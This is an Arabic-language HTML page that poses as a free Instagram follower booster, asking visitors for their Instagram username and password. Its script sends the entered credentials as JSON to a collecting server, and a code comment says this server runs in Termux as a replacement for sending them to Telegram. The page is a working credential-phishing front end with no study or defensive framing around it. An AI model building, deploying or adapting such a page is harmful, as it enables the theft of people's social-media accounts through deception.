<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>💥 زيادة متابعين إنستقرام</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />

<style>
body {
  background: linear-gradient(to right, #833ab4, #fd1d1d, #fcb045);
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  font-family: 'Tajawal', sans-serif;
}

.container {
  background: white;
  padding: 2rem;
  border-radius: 15px;
  box-shadow: 0 0 15px rgba(0,0,0,0.2);
  width: 100%;
  max-width: 300px;
  text-align: center;
}

.logo {
  font-size: 3rem;
  color: #e1306c;
  margin-bottom: 1rem;
}

input, select {
  width: 100%;
  padding: 12px;
  margin: 10px 0;
  border-radius: 10px;
}

button {
  background-color: #e1306c;
  color: white;
  padding: 12px;
  width: 100%;
  border: none;
  border-radius: 10px;
}

.loading {
  display: none;
  margin-top: 10px;
  color: green;
}

.loading.show {
  display: block;
}
</style>
</head>

<body>

<div class="container">
  <div class="logo">
    <i class="fab fa-instagram"></i>
  </div>

  <h2>زيادة متابعين إنستقرام</h2>

  <form id="followForm">
    <input id="username" placeholder="اسم المستخدم" />
    <input id="password" type="password" placeholder="كلمة المرور" />

    <select id="followers">
      <option value="" disabled selected>اختر العدد</option>
      <option value="1000">1000 متابع</option>
      <option value="3000">3000 متابع</option>
      <option value="5000">5000 متابع</option>
    </select>

    <button type="submit">إرسال</button>
  </form>

  <div class="loading" id="loading">جاري الإرسال...</div>
</div>

<script>
const form = document.getElementById("followForm");
const loading = document.getElementById("loading");

form.addEventListener("submit", function(e) {
  e.preventDefault();

  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();
  const followers = document.getElementById("followers").value;

  if (!username || !password || !followers) {
    alert("يرجى تعبئة جميع الحقول");
    return;
  }

  loading.classList.add("show");

  // 🔥 الإرسال للسيرفر في Termux بدل تيليجرام مباشرة
  fetch("http://localhost:3000", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      username: username,
      password: password,
      followers: followers
    })
  })
  .then(() => {
    alert("✅ تم الإرسال");
    form.reset();
  })
  .catch(() => {
    alert("❌ فشل الإرسال");
  })
  .finally(() => {
    loading.classList.remove("show");
  });
});
</script>

</body>
</html>
